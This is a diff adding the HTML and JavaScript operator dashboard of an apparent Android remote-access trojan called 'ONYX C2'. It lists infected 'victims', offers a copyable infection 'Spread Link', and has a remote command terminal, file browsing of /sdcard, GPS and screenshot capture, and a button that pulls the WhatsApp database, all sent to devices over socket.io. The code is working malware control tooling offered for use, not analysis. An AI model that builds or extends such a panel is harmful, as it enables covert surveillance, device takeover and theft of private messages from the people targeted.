@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ONYX C2 Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        body { background: #0a0a14; color: #e0e0e0; font-family: 'Courier New', monospace; }
+        .sidebar { background: #10101a; min-height: 100vh; border-right: 1px solid #2a2a3a; padding: 20px; }
+        .card-dark { background: #14141f; border: 1px solid #2a2a40; border-radius: 16px; padding: 15px; margin-bottom: 20px; }
+        .terminal-box { background: #05050a; border-radius: 10px; padding: 15px; max-height: 300px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; }
+        .victim-item { padding: 8px 12px; border-radius: 8px; cursor: pointer; border-bottom: 1px solid #1a1a2a; }
+        .victim-item:hover { background: #2a2a4a; }
+        .victim-item.active { background: #7c3aed; }
+        .premium-btn { background: linear-gradient(135deg, #7c3aed, #4f46e5); border: none; padding: 6px 18px; border-radius: 30px; color: #fff; }
+        .premium-btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="container-fluid">
+    <div class="row">
+        <div class="col-md-3 col-lg-2 sidebar">
+            <h3 class="text-primary"><i class="fas fa-skull"></i> ONYX</h3>
+            <hr class="border-secondary">
+            <div class="mb-3">
+                <label class="text-muted small">Spread Link</label>
+                <input id="spreadLink" class="form-control form-control-sm bg-dark text-light border-secondary" value="http://{{ ip }}/infect" readonly>
+                <button class="btn btn-sm btn-outline-info mt-1" onclick="navigator.clipboard.writeText(document.getElementById('spreadLink').value)">Copy</button>
+            </div>
+            <h6>Victims (<span id="vCount">0</span>)</h6>
+            <div id="victimList"></div>
+            <button class="btn btn-sm btn-danger mt-3" onclick="logout()">Logout</button>
+        </div>
+        <div class="col-md-9 col-lg-10 p-3">
+            <ul class="nav nav-tabs" id="mainTabs">
+                <li class="nav-item"><a class="nav-link active" data-bs-toggle="tab" href="#term">Terminal</a></li>
+                <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#files">Files</a></li>
+                <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#loc">GPS/Cam</a></li>
+                <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#wa">WhatsApp</a></li>
+            </ul>
+            <div class="tab-content">
+                <div class="tab-pane active" id="term">
+                    <div class="card-dark">
+                        <div id="termOut" class="terminal-box">$ Ready. Select a victim.</div>
+                        <div class="input-group mt-2">
+                            <input id="cmdInp" class="form-control bg-dark text-light" placeholder="ls /sdcard">
+                            <button class="premium-btn" onclick="sendCmd()">Run</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="tab-pane" id="files">
+                    <div class="card-dark">
+                        <div class="input-group mb-2">
+                            <input id="filePath" class="form-control bg-dark text-light" value="/sdcard">
+                            <button class="premium-btn" onclick="sendCmd('list_files', document.getElementById('filePath').value)">List</button>
+                        </div>
+                        <div id="fileList" class="terminal-box" style="max-height:400px;"></div>
+                    </div>
+                </div>
+                <div class="tab-pane" id="loc">
+                    <div class="card-dark">
+                        <button class="premium-btn" onclick="sendCmd('get_location')"><i class="fas fa-map-pin"></i> GPS</button>
+                        <button class="premium-btn" onclick="sendCmd('take_screenshot')"><i class="fas fa-camera"></i> Screenshot</button>
+                        <div id="locDisplay" class="mt-2">Waiting...</div>
+                        <img id="imgDisplay" style="max-width:100%; max-height:300px; display:none;">
+                    </div>
+                </div>
+                <div class="tab-pane" id="wa">
+                    <div class="card-dark">
+                        <button class="premium-btn" onclick="sendCmd('pull_whatsapp')">Pull WhatsApp DB</button>
+                        <div id="waOut" class="terminal-box mt-2">Ready.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+const socket = io();
+let current = null;
+const term = document.getElementById('termOut');
+socket.on('victims_list', updateVictims);
+socket.on('command_result', (data) => {
+    if (data.device_id === current) {
+        term.innerText += '\n> ' + data.data;
+        term.scrollTop = term.scrollHeight;
+    }
+});
+function updateVictims(ids) {
+    const list = document.getElementById('victimList');
+    list.innerHTML = '';
+    ids.forEach(id => {
+        const div = document.createElement('div');
+        div.className = 'victim-item';
+        div.innerText = id.substring(0, 12) + '...';
+        div.onclick = () => {
+            current = id;
+            document.querySelectorAll('.victim-item').forEach(el => el.classList.remove('active'));
+            div.classList.add('active');
+        };
+        list.appendChild(div);
+    });
+    document.getElementById('vCount').innerText = ids.length;
+}
+function sendCmd(cmd, arg) {
+    if (!current) return alert('Select a victim first.');
+    const fullCmd = cmd ? (arg ? cmd + ':' + arg : cmd) : document.getElementById('cmdInp').value;
+    if (!fullCmd) return;
+    socket.emit('send_cmd', { id: current, cmd: fullCmd });
+    if (!cmd) document.getElementById('cmdInp').value = '';
+}
+socket.emit('get_victims');
+function logout() {
+    document.cookie.split(";").forEach(c => document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"));
+    window.location.href = '/login';
+}
+</script>
+</body>
+</html>
